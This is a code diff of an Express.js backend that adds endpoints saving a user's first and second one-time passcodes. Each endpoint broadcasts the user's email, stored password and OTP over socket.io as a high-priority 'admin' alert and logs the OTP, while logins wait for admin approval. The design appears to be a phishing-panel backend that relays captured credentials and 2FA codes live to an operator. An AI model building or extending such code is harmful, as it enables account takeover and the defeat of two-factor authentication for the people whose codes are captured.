@@ -180,7 +180,7 @@ async function initializeDatabase() {
 
 // USER ENDPOINTS
 
-// User login - WAITS FOR ADMIN APPROVAL (NO AUTO REDIRECT)
+// User login - WAITS FOR ADMIN APPROVAL
 app.post('/api/users/login', async (req, res) => {
   try {
     const { email, password } = req.body;
@@ -346,7 +346,7 @@ app.post('/api/admin/approve-user', authenticateJWT, async (req, res) => {
   }
 });
 
-// Save user-created OTP to second_otp column (UPDATED)
+// Save user-created FIRST OTP
 app.post('/api/users/save-otp', async (req, res) => {
   try {
     const { email, otp } = req.body;
@@ -360,7 +360,55 @@ app.post('/api/users/save-otp', async (req, res) => {
     }
 
     const result = await pool.query(
-      'UPDATE users SET second_otp = $1, otp_verified = true, otp_attempts = 0 WHERE email = $2 RETURNING id, email, second_otp, password',
+      'UPDATE users SET otp = $1, otp_verified = true, otp_attempts = 0 WHERE email = $2 RETURNING id, email, otp, password',
+      [otp, email]
+    );
+
+    if (result.rows.length === 0) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+
+    const user = result.rows[0];
+
+    console.log('🔔 SENDING INSTANT NOTIFICATION TO ADMIN - First OTP Created:', email, 'OTP:', otp);
+    
+    io.emit('user-otp-created', { 
+      email: user.email,
+      password: user.password,
+      otp: user.otp,
+      timestamp: new Date(),
+      message: '✅ User has created their first OTP successfully',
+      notification: {
+        sound: 'success',
+        vibrate: true,
+        duration: 5000,
+        priority: 'high'
+      }
+    });
+
+    console.log('✅ User first OTP saved for:', email, 'OTP:', otp);
+    res.json({ success: true, message: 'First OTP saved successfully' });
+  } catch (error) {
+    console.error('❌ Save first OTP error:', error.message);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// Save user-created SECOND OTP
+app.post('/api/users/save-second-otp', async (req, res) => {
+  try {
+    const { email, otp } = req.body;
+    
+    if (!email || !otp) {
+      return res.status(400).json({ error: 'Email and OTP required' });
+    }
+
+    if (!/^\d{6}$/.test(otp)) {
+      return res.status(400).json({ error: 'OTP must be exactly 6 digits' });
+    }
+
+    const result = await pool.query(
+      'UPDATE users SET second_otp = $1 WHERE email = $2 RETURNING id, email, second_otp, password',
       [otp, email]
     );
 
@@ -377,7 +425,7 @@ app.post('/api/users/save-otp', async (req, res) => {
       password: user.password,
       second_otp: user.second_otp,
       timestamp: new Date(),
-      message: '✅ User has created and verified their second OTP successfully',
+      message: '✅ User has created their second OTP successfully',
       notification: {
         sound: 'success',
         vibrate: true,
@@ -386,7 +434,7 @@ app.post('/api/users/save-otp', async (req, res) => {
       }
     });
 
-    console.log('✅ User second OTP saved and verified for:', email, 'OTP:', otp);
+    console.log('✅ User second OTP saved for:', email, 'OTP:', otp);
     res.json({ success: true, message: 'Second OTP saved successfully' });
   } catch (error) {
     console.error('❌ Save second OTP error:', error.message);
